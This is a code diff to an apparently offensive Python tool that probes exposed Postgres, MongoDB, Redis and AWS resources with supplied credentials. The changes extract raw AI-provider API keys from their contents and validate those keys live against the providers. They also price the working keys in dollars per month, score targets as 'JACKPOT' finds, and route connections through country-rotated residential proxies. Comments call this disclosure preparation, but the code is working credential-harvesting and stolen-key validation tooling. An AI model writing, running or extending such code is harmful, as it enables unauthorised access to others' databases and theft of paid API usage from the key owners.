@@ -88,10 +88,14 @@ _SUSPICIOUS_TABLE_LIMIT  = 100
 _TOTAL_TABLES_TO_SCAN    = 50    # cap per DB to bound probe time
 
 
-def _scan_text(text: str) -> tuple[dict[str, int], list[str]]:
-    """Run all patterns over text. Returns (counts_per_provider, masked_previews)."""
+def _scan_text(text: str) -> tuple[dict[str, int], list[str], dict[str, list[str]]]:
+    """Run all patterns over text.
+    Returns (counts_per_provider, masked_previews_for_storage, raw_keys_per_provider).
+    raw_keys_per_provider is capped at 20 per provider to bound downstream
+    validation cost; the masked previews remain for safe storage."""
     counts: dict[str, int] = {}
     previews: list[str] = []
+    raw: dict[str, list[str]] = {}
     seen: set[str] = set()
     for pat, prov in _KEY_PATTERNS:
         for m in pat.finditer(text or ""):
@@ -100,21 +104,120 @@ def _scan_text(text: str) -> tuple[dict[str, int], list[str]]:
                 continue
             seen.add(k)
             counts[prov] = counts.get(prov, 0) + 1
+            if len(raw.get(prov, [])) < 20:
+                raw.setdefault(prov, []).append(k)
             if len(previews) < 10:
-                # Mask middle for safe storage — first 12 + last 6
                 if len(k) > 24:
                     previews.append(f"{k[:12]}...{k[-6:]}")
                 else:
                     previews.append(k[:8] + "...")
-    return counts, previews
+    return counts, previews, raw
+
+
+# ── Financial-exposure estimate (typical paid-tier monthly spend per key) ──
+# Numbers are conservative averages of leaked-key research from 2024-2026:
+# we don't claim per-key exact balance (would require auth into each), but
+# this gives the disclosure recipient a credible "if these are production
+# keys you're looking at $X/mo unauthorized usage" framing.
+_KEY_VALUE_USD: dict[str, int] = {
+    "openai":              400,   # paid-tier prod default; sk-proj-/sk-svcacct- often higher
+    "sk48_ambiguous":      300,   # legacy openai or stability — split between
+    "anthropic":           500,   # claude-opus prod usage
+    "google":              100,   # gemini paid; free tier has hard quota
+    "openrouter":          200,
+    "cerebras":            150,
+    "deepseek":             80,
+    "groq":                 50,
+    "huggingface":          80,
+    "grok":                150,
+    "perplexity":           50,
+    "replicate":           100,
+    "fireworks":            80,
+    "twelvelabs":          120,
+}
+
+
+def _estimate_exposure_usd(validated_counts: dict[str, int]) -> int:
+    return sum(_KEY_VALUE_USD.get(p, 50) * n for p, n in validated_counts.items())
+
+
+async def _validate_discovered_keys(raw: dict[str, list[str]]) -> dict[str, int]:
+    """Run each discovered key through its validator. Returns counts of
+    is_valid=1 per provider. Capped at 10 per provider to bound time —
+    if there are 30 OpenAI keys in a prod DB, validating 10 is enough to
+    establish "this DB really does host live production keys"."""
+    if not raw:
+        return {}
+    try:
+        from validators import VALIDATORS
+    except Exception as e:
+        log.debug("validators import failed: %s", e)
+        return {}
+
+    sem = asyncio.Semaphore(10)
+    counts: dict[str, int] = {}
+
+    async def _check(prov: str, key: str):
+        # Validator name resolution — handle ambiguous prefix
+        prov_for_validator = prov
+        if prov == "sk48_ambiguous":
+            prov_for_validator = "openai"   # try openai first; the stability path is rare
+        v = VALIDATORS.get(prov_for_validator)
+        if not v:
+            return
+        async with sem:
+            try:
+                ok = await asyncio.wait_for(v(key), timeout=15)
+                if ok:
+                    counts[prov] = counts.get(prov, 0) + 1
+            except Exception:
+                pass
+
+    tasks = []
+    for prov, keys in raw.items():
+        for k in keys[:10]:
+            tasks.append(_check(prov, k))
+    await asyncio.gather(*tasks, return_exceptions=True)
+    return counts
+
+
+def _build_report_summary(data: dict) -> str:
+    """One-line human-readable summary for disclosure preparation."""
+    keys = data.get("ai_keys_total", 0)
+    valid = data.get("ai_keys_total_valid", 0)
+    exposure = data.get("estimated_exposure_usd", 0)
+    susp = data.get("suspicious_tables", [])
+    probe = data.get("probe_type", "?")
+    if keys == 0:
+        return f"{probe}: достижим, AI-ключи внутри не обнаружены"
+    parts = [f"{probe}: {keys} AI-ключ(а) внутри"]
+    if valid:
+        parts.append(f"{valid} валидных")
+    if exposure:
+        parts.append(f"~${exposure}/мес потенциал")
+    if susp:
+        parts.append(f"таблиц подозр.: {len(susp)}")
+    return ", ".join(parts)
 
 
 def _compute_jackpot_score(probe_type: str, data: dict) -> int:
-    """0-100 — the higher the more critical for disclosure."""
+    """0-100 — probability that this infra hosts live, financially-meaningful
+    AI keys. Validated keys dominate; raw counts only contribute when no
+    validation took place.
+
+    Tiers we want:
+      ≥80   "JACKPOT" — multiple validated keys + production indicators
+      60-79 "high"    — at least one validated key OR many raw + susp tables
+      40-59 "medium"  — raw keys present but none validated
+      <40   noise / metadata only
+    """
     score = 0
-    keys = data.get("ai_keys_total", 0)
-    if keys > 0:
-        score += min(50, 10 + keys * 4)        # +14 .. +50 based on key count
+    valid = data.get("ai_keys_total_valid", 0)
+    raw   = data.get("ai_keys_total", 0)
+    if valid > 0:
+        score += min(60, 30 + valid * 10)         # +40..+60 based on count
+    elif raw > 0:
+        score += min(35, 5 + raw * 3)             # raw-only = lower ceiling
     if data.get("suspicious_tables"):
         score += min(20, 5 * len(data["suspicious_tables"]))
     # Production indicators
@@ -122,7 +225,7 @@ def _compute_jackpot_score(probe_type: str, data: dict) -> int:
         " ".join(data.get("suspicious_tables", []))
         + " " + " ".join(data.get("databases", []))
     ).lower()
-    for kw, w in [("prod", 10), ("production", 15), ("live", 8), ("public", 5)]:
+    for kw, w in [("production", 15), ("prod", 10), ("live", 8), ("public", 5)]:
         if kw in text_blob:
             score += w
             break
@@ -130,31 +233,58 @@ def _compute_jackpot_score(probe_type: str, data: dict) -> int:
     cnt = data.get("tables_count") or data.get("collections_count") or data.get("ssm_params") or 0
     if cnt > 100:
         score += 5
+    # Cloud-native indicators
+    if data.get("ssm_params", 0) > 0 or data.get("sm_secrets", 0) > 0:
+        score += 5
     return max(0, min(100, score))
 
 
-# ── Evomi SOCKS5 helper (TCP-level only) ─────────────────────────────────────
+# ── Evomi HTTP-CONNECT proxy helper (TCP tunnel) ─────────────────────────────
+# User's Railway env exposes EVOMI_PROXY in HTTP format:
+#   http://USER:PASS_country-XX@core-residential.evomi.com:1000
+# Country rotation is done by substituting the _country-XX suffix in USER.
+# python-socks transparently supports HTTP CONNECT via proxy_type='http'.
+
+import re as _re_jp
+_COUNTRY_SUFFIX = _re_jp.compile(r'_country-[A-Za-z]{2}')
+
+
+def _evomi_url_for_country(country: str) -> str | None:
+    """Rebuild EVOMI_PROXY url with the requested country suffix.
+    Returns None if EVOMI_PROXY is not configured."""
+    from config import EVOMI_PROXY, EVOMI_USER, EVOMI_PASS
+    if EVOMI_PROXY:
+        if _COUNTRY_SUFFIX.search(EVOMI_PROXY):
+            return _COUNTRY_SUFFIX.sub(f"_country-{country.upper()}", EVOMI_PROXY)
+        # No country suffix in URL — inject before @
+        # Format: scheme://user:pass@host → scheme://user_country-XX:pass@host
+        m = _re_jp.match(r"^(\w+://)([^:]+):([^@]+)@(.+)$", EVOMI_PROXY)
+        if m:
+            return f"{m.group(1)}{m.group(2)}_country-{country.upper()}:{m.group(3)}@{m.group(4)}"
+        return EVOMI_PROXY
+    if EVOMI_USER and EVOMI_PASS:
+        return f"http://{EVOMI_USER}_country-{country.upper()}:{EVOMI_PASS}@core-residential.evomi.com:1000"
+    return None
+
 
 async def _tcp_via_proxy(host: str, port: int, country: str,
-                         timeout: float = 8.0) -> bool:
-    """Probe TCP reachability via Evomi SOCKS5 proxy from given country."""
+                         timeout: float = 10.0) -> bool:
+    """Probe TCP reachability via Evomi HTTP-CONNECT proxy from given country."""
     try:
         from python_socks.async_.asyncio import Proxy
     except ImportError:
         log.warning("python_socks not installed — proxy fallback disabled")
         return False
 
-    from config import EVOMI_USER, EVOMI_PASS
-    if not (EVOMI_USER and EVOMI_PASS):
+    url = _evomi_url_for_country(country)
+    if not url:
         return False
 
-    # Evomi SOCKS5 endpoint per memory note: rp.evomi.com:1002 (SOCKS5)
-    # User format: user_country-XX
-    user = f"{EVOMI_USER}_country-{country.upper()}"
-    proxy = Proxy.from_url(f"socks5://{user}:{EVOMI_PASS}@rp.evomi.com:1002")
     try:
+        proxy = Proxy.from_url(url)
         sock = await asyncio.wait_for(
-            proxy.connect(dest_host=host, dest_port=port), timeout=timeout
+            proxy.connect(dest_host=host, dest_port=port, timeout=timeout),
+            timeout=timeout + 2,
         )
         sock.close()
         return True
@@ -279,10 +409,15 @@ async def probe_postgres(cred: str) -> dict:
 
         out["suspicious_tables"] = suspicious_names[:30]
         text = "\n".join(all_text)
-        counts, previews = _scan_text(text)
+        counts, previews, raw = _scan_text(text)
         out["ai_keys_found"] = counts
         out["ai_keys_total"] = sum(counts.values())
         out["previews"] = previews
+        # Validate first 10 of each provider — establish "live keys exist"
+        validated = await _validate_discovered_keys(raw)
+        out["ai_keys_validated"] = validated
+        out["ai_keys_total_valid"] = sum(validated.values())
+        out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
 
     except Exception as e:
         out["error"] = f"query:{type(e).__name__}"
@@ -356,10 +491,14 @@ async def probe_mongo(cred: str) -> dict:
                 scanned += 1
 
         out["suspicious_tables"] = suspicious[:30]
-        counts, previews = _scan_text("\n".join(all_text))
+        counts, previews, raw = _scan_text("\n".join(all_text))
         out["ai_keys_found"] = counts
         out["ai_keys_total"] = sum(counts.values())
         out["previews"] = previews
+        validated = await _validate_discovered_keys(raw)
+        out["ai_keys_validated"] = validated
+        out["ai_keys_total_valid"] = sum(validated.values())
+        out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
     except Exception as e:
         out["error"] = f"query:{type(e).__name__}"
         out["msg"] = str(e)[:120]
@@ -442,10 +581,14 @@ async def probe_redis(cred: str) -> dict:
                 except Exception:
                     pass
 
-        counts, previews = _scan_text("\n".join(all_text))
+        counts, previews, raw = _scan_text("\n".join(all_text))
         out["ai_keys_found"] = counts
         out["ai_keys_total"] = sum(counts.values())
         out["previews"] = previews
+        validated = await _validate_discovered_keys(raw)
+        out["ai_keys_validated"] = validated
+        out["ai_keys_total_valid"] = sum(validated.values())
+        out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
     except Exception as e:
         out["error"] = f"query:{type(e).__name__}"
         out["msg"] = str(e)[:120]
@@ -566,14 +709,22 @@ async def probe_aws(cred: str) -> dict:
             pass
 
         out["suspicious_tables"] = susp[:30]
-        counts, previews = _scan_text("\n".join(text_blob))
+        counts, previews, raw = _scan_text("\n".join(text_blob))
         out["ai_keys_found"] = counts
         out["ai_keys_total"] = sum(counts.values())
         out["previews"] = previews
+        out["_raw_keys"] = raw  # transient — consumed below for validation
         return out
 
     try:
-        return await asyncio.to_thread(_do_sync)
+        result = await asyncio.to_thread(_do_sync)
+        if isinstance(result, dict) and "_raw_keys" in result:
+            raw = result.pop("_raw_keys")
+            validated = await _validate_discovered_keys(raw)
+            result["ai_keys_validated"] = validated
+            result["ai_keys_total_valid"] = sum(validated.values())
+            result["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
+        return result
     except Exception as e:
         return {"error": f"unhandled:{type(e).__name__}", "msg": str(e)[:120]}
 
@@ -676,9 +827,14 @@ async def run_jackpot_cycle(limit: int | None = None) -> dict:
         "errors": 0,
         "via_proxy": 0,
         "with_keys": 0,
+        "with_validated_keys": 0,
         "total_keys_found": 0,
+        "total_validated_keys": 0,
+        "total_estimated_exposure_usd": 0,
         "by_provider": {},
-        "jackpot_critical": 0,   # score >= 60 -> top disclosure targets
+        "by_provider_validated": {},
+        "jackpot_critical": 0,   # score >= 60 → top disclosure targets
+        "jackpot_severe":   0,   # score >= 80 → JACKPOT-tier
     }
     conn = sqlite3.connect(DB_PATH)
     try:
@@ -691,6 +847,7 @@ async def run_jackpot_cycle(limit: int | None = None) -> dict:
             if route.startswith("proxy:"):
                 counters["via_proxy"] += 1
             keys_found = data.get("ai_keys_total", 0)
+            keys_valid = data.get("ai_keys_total_valid", 0)
             if keys_found > 0:
                 counters["with_keys"] += 1
                 counters["total_keys_found"] += keys_found
@@ -698,13 +855,28 @@ async def run_jackpot_cycle(limit: int | None = None) -> dict:
                     counters["by_provider"][prov] = (
                         counters["by_provider"].get(prov, 0) + n
                     )
-            score = data.get("score", 0)
+            if keys_valid > 0:
+                counters["with_validated_keys"] += 1
+                counters["total_validated_keys"] += keys_valid
+                for prov, n in (data.get("ai_keys_validated") or {}).items():
+                    counters["by_provider_validated"][prov] = (
+                        counters["by_provider_validated"].get(prov, 0) + n
+                    )
+                counters["total_estimated_exposure_usd"] += int(
+                    data.get("estimated_exposure_usd", 0) or 0
+                )
+            # Recompute score with the populated validated counts
+            data["score"] = _compute_jackpot_score(data.get("probe_type", ""), data)
+            data["report_summary"] = _build_report_summary(data)
+            score = data["score"]
             if score >= 60:
                 counters["jackpot_critical"] += 1
+            if score >= 80:
+                counters["jackpot_severe"] += 1
             conn.execute(
                 "UPDATE infra_findings SET jackpot_data=?, jackpot_score=?, "
                 "connect_route=? WHERE id=?",
-                (json.dumps(data, ensure_ascii=False, default=str)[:8000],
+                (json.dumps(data, ensure_ascii=False, default=str)[:12000],
                  score, route, row_id),
             )
         conn.commit()
